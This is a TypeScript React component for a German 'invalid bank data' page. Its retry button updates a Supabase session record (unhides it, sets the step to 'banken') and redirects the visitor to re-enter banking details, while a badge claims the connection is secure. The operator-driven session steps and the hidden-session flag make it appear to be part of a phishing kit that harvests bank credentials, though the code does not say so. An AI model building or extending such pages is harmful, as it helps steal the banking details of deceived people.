"use client";

import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function InvalidBankClient({ sessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();

  const handleRetry = async () => {
    const supabase = createBrowserSupabaseClient();
    if (supabase) {
      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    window.location.replace("/banken"); // ⭐ FLASH YOK: href → replace
  };


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  return (
    <div className="a3d-shell">
      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)] animate-[pulse_6s_ease-in-out_infinite]" />
      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)] animate-[pulse_8s_ease-in-out_infinite_alternate]" />

      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-4">
        {!sessionId ? (
          <p className="a3d-in w-full max-w-sm rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600 shadow-sm">
            Ungueltiger Link.
          </p>
        ) : (
          <div className="a3d-card a3d-in flex w-full max-w-[460px] flex-col items-center overflow-hidden px-6 py-9 text-center sm:px-9">
            <div className="relative mb-6 flex h-24 w-24 items-center justify-center">
              <div className="absolute inset-0 rounded-full border border-[rgba(var(--brand-rgb),0.18)]" />
              <div className="absolute inset-[10px] rounded-full border border-[rgba(var(--brand-rgb),0.14)]" />
              <div className="absolute inset-[18px] rounded-full bg-[rgba(var(--brand-rgb),0.12)] blur-md" />
              <div className="relative z-10 rounded-full bg-[rgba(var(--brand-rgb),0.10)] p-4">
                <svg className="h-9 w-9 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
              </div>
            </div>

            <h2 className="a3d-title mb-3 text-[24px]">
              Ungueltige Bankdaten
            </h2>

            <p className="a3d-sub mb-8 max-w-[26rem] text-[15px] font-medium leading-relaxed">
              Die eingegebenen Daten konnten nicht verifiziert werden. Ueberpruefen Sie die Angaben und versuchen Sie es erneut.
            </p>

            <button
              onClick={() => void handleRetry()}
              className="a3d-btn w-full max-w-[22rem] px-6 py-4 text-[16px]"
            >
              <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
              Erneut versuchen
            </button>

            <div className="mt-7">
              <div className="a3d-pill">
                <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                <span>Sichere Verbindung bleibt aktiv</span>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
